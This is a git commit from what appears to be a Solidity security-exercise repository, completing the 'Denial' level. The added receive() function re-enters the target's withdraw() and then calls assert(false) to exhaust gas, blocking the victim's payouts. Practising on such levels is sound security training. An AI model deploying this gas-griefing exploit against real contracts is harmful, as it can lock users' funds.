57aa74a633109d0bbcb6828bd1321a41ad8b975e
agusbrav <agus.brav@gmail.com>
2022-05-15 17:28:34 -0300

    7. Completed Denial contract attack.

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -9,5 +9,15 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        //Withdraw two times, second time with assert reverting with no gas left for any other execution.
+        bool flag;
+        if (!flag){
+            Denial(contractAddress).withdraw();
+            flag = true;
+        }
+        if (flag){
+            assert(false);
+        }
+    }
 }
